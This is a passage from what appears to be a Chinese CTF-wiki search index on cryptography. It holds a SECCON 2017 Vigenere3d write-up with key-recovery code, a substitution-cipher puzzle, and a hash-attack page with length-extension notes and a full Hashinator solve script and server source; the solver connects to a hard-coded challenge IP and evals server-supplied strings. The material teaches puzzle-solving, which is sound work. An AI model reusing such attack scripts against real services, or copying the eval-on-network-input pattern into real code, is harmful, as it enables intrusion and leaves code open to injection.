\"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 c = \"\" for a in p : c += t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return c print main ( sys . argv [ 1 ], sys . argv [ 2 ], sys . argv [ 2 ][:: - 1 ]) $ python Vigenere3d . py SECCON { ************************** } ************** POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210 t[i][j]=s[i+j:]+s[:i+j] \\\\ t[i][k]=s[i+k:]+s[:i+k] t[i][j]=s[i+j:]+s[:i+j] \\\\ t[i][k]=s[i+k:]+s[:i+k] t[i][j][k] t[i][j][k] \u4e3a t[i][j] t[i][j] \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0c t[i][k][j] t[i][k][j] \u4e3a t[i][k] t[i][k] \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f i+j+k i+j+k \u662f\u5426\u8d85\u8fc7 len(s) \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373 t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j] \u3002 \u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002 \u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002 \u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b def get_key ( plain , cipher ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 key = [ '*' ] * 14 for i in range ( len ( plain )): for i1 in range ( len ( s )): for i2 in range ( len ( s )): if t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])] == cipher [ i ]: key [ i ] = s [ i1 ] key [ 13 - i ] = s [ i2 ] return '' . join ( key ) \u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b def decrypt ( cipher , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 plain = \"\" for a in cipher : for i in range ( len ( s )): if t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] == a : plain += s [ i ] break i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return plain \u5f97\u5230\u660e\u6587\u5982\u4e0b \u279c 2017_seccon_vigenere3d git: ( master ) python exp.py SECCON { Welc0me_to_SECCON_CTF_2017 }","title":"2017 SECCON Vigenere3d"},{"location":"crypto/classical/summary/#_4","text":"\u5bc6\u6587 of zit kggd zitkt qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz zg hxz zitd of gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl:hstqlt eiqfut zit ygkd gy zit fxdwtk ngx utz.zit hkgukqddtkl! \u4f7f\u7528 quipquip \u76f4\u63a5\u89e3\u5bc6\u3002","title":"\u6d88\u5931\u7684\u4e09\u91cd\u5bc6\u7801"},{"location":"crypto/hash/attack/","text":"Hash Attack \u00b6 \u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b \u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002 \u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002 \u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002 \u66b4\u529b\u653b\u51fb \u00b6 HashCat \u5de5\u5177 \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b HashCat \u5b98\u7f51 HashCat \u7b80\u5355\u4f7f\u7528 \u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09 \u00b6 \u4ecb\u7ecd \u00b6 \u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea \u7ef4\u57fa\u767e\u79d1 \u3002 \u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728 \u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5 \u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002 \u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9 \u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002 \u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002 \u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 \u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373 now=key|s|padding \u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373 key|s|padding|extra \u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c \u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002 \u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002 \u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002 \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002 \u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002 \u4f8b\u5b50 \u00b6 \u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002 \u5de5\u5177 \u00b6 hashpump \u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002 hash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef \u00b6 \u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002 Hashinator \u00b6 \u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a password \uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684 password \u3002 \u5206\u6790 \u00b6 \u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a md5 \uff0c sha1 \uff0c blake \uff0c scrypt \u3002 \u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) 1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece rockyou.txt \u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a password \uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002 2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684 password \u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a 128 - len(password) \u7684 salt \u3002 3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002 4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684 password \u3001 salt \u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684 password_hash \u3002 \u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002 \u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230 generate_salt() \u51fd\u6570\u4e2d\uff0c salt \u548c password \u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86 msize = 128 # f-you hashcat :D so\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002 \u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b calculate_hash() \u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) final_hash = interim_salt + interim_hash \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a 1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002 2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002 3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002 4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230 interim_salt \u548c interim_hash \u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002 5. interim_salt \u548c interim_hash \u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002 \u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b interim_salt \u548c interim_hash \u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002 interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) \u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5 interim\\_hash_1 interim\\_hash_1 \u548c interim\\_salt_3 interim\\_salt_3 \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa interim\\_hash_2 interim\\_hash_2 \u7684\u503c\uff0c\u800c interim\\_hash_2 interim\\_hash_2 \u5219\u662f\u4e0a\u4e00\u8f6e\u7684 interim_hash \u3002 \u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684 password \u548c salt \u3002 \u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a import os import hashlib import socket import threading import socketserver import struct import time import threading # import pyscrypt from base64 import b64encode , b64decode from pwn import * def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) def main (): # io = socket.socket(family=socket.AF_INET) # io.connect(('47.88.216.38', 20013)) io = remote ( '47.88.216.38' , 20013 ) print ( io . recv ( 1000 )) ans_array = bytearray () while True : buf = io . recv ( 1 ) if buf : ans_array . extend ( buf ) if buf == b '!' : break password_hash_base64 = ans_array [ ans_array . find ( b \"b'\" ) + 2 : ans_array . find ( b \"' \\n \" )] password_hash = b64decode ( password_hash_base64 ) print ( 'password:' , password_hash ) method_bytes = ans_array [ ans_array . find ( b 'used: \\n ' ) + 6 : ans_array . find ( b ' \\n Your' ) ] methods = method_bytes . split ( b ' \\n ' ) methods = [ bytes ( x . strip ( b '- ' )) . decode () for x in methods ] print ( methods ) in_salt = password_hash [: 64 ] in_hash = password_hash [ 64 :] for pos , neg in zip ( methods , methods [:: - 1 ]): ''' interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) ''' in_hash = xor ( in_hash , eval ( \"{}(in_salt)\" . format ( neg ))) in_salt = xor ( in_salt , eval ( \"{}(in_hash)\" . format ( pos ))) print ( in_hash , in_salt ) print ( in_hash [ - 20 :]) io . interactive () main () \u539fhash\u7b97\u6cd5 \u00b6 import os import hashlib import socket import threading import socketserver import struct import time # import pyscrypt from base64 import b64encode def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) class HashHandler ( socketserver . BaseRequestHandler ): welcome_message = \"\"\" Welcome, young wanna-be Cracker, to the Hashinator. To prove your worthiness, you must display the power of your cracking skills. The test is easy: 1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms. 2. You crack the hash and send back the original password. As you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right? Please wait while we generate your hash... \"\"\" hashes = [ md5 , sha , blake , scrypt ] timeout = 10 total_rounds = 32 def handle ( self ): self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) self . generate_delay () self . request . sendall ( \"Challenge password hash: {} \\n \" . format ( b64encode ( password_hash )) . encode ()) self . request . sendall ( \"Rounds used: \\n \" . encode ()) test_rounds = [] for r in hash_rounds : test_rounds . append ( r ) for r in hash_rounds : self . request . sendall ( \"- {} \\n \" . format ( r . __name__ ) . encode ()) self . request . sendall ( \"Your time starts now! \\n \" . encode ()) self . request . settimeout ( self . timeout ) try : response = self . request . recv ( 1024 ) if response . strip () == password : self . request . sendall ( \"Congratulations! You are a true cracking master! \\n \" . encode ()) self . request . sendall ( \"Welcome to the club: {} \\n \" . format ( flag ) . encode ()) return except socket . timeout : pass self . request . sendall ( \"Your cracking skills are bad, and you should feel bad!\" . encode ()) def generate_password ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] lines = 14344391 # size of rockyou line = rand % lines password = \"\" f = open ( 'rockyou.txt' , 'rb' ) for i in range ( line ): password = f . readline () return password . strip () def generate_salt ( self , p ): msize = 128 # f-you hashcat :D salt_size = msize - len ( p ) return os . urandom ( salt_size ) def generate_rounds ( self ): rand = struct . unpack ( \"Q\" , os . urandom ( 8 ))[ 0 ] rounds = [] for i in range ( self . total_rounds ): rounds . append ( self . hashes [ rand % len ( self . hashes )]) rand = rand >> 2 return rounds def calculate_hash ( self , payload , hash_rounds ): interim_salt = payload [: 64 ] interim_hash = payload [ 64 :] for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) ''' interim_hash = xor( interim_hash, hash_rounds[i]( xor(interim_salt, hash_rounds[-1-i](interim_hash)) ) ) ''' final_hash = interim_salt + interim_hash return final_hash def generate_delay ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] time . sleep ( rand / 1000000000.0 ) class ThreadedTCPServer ( socketserver . ThreadingMixIn , socketserver . TCPServer ): allow_reuse_address = True PORT = 1337 HOST = '0.0.0.0' flag = \"\" with open ( \"flag.txt\" ) as f : flag = f . read () def main (): server = ThreadedTCPServer (( HOST , PORT ), HashHandler ) server_thread = threading . Thread ( target = server . serve_forever ) server_thread . start () server_thread . join () if __name__ == \"__main__\" : main ()","title":"Hash Attack"},{"location":"crypto/hash/attack/#hash-attack","text":"\u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b \u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002 \u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002 \u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002","title":"Hash Attack"},{"location":"crypto/hash/attack/#_1","text":"HashCat \u5de5\u5177 \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b HashCat \u5b98\u7f51 HashCat \u7b80\u5355\u4f7f\u7528","title":"\u66b4\u529b\u653b\u51fb"},{"location":"crypto/hash/attack/#hash-length-extension-attacks","text":"","title":"\u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09"},{"location":"crypto/hash/attack/#_2","text":"\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea \u7ef4\u57fa\u767e\u79d1 \u3002 \u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728 \u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5 \u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002 \u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9 \u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002 